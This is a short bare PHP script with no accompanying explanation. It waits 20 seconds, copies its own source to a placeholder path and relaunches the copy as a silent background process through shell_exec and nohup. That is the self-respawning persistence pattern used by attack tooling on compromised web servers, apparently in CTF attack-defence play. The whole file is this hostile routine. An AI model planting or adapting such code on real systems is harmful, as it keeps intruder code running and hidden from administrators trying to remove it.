<?php
$fp = "/pathflagpathflag";
sleep(20);
while (!file_exists($fp)) {
    $f = file_get_contents(__FILE__);
    file_put_contents($fp,$f);
    shell_exec("nohup php -f {$fp} 2> /dev/null");
}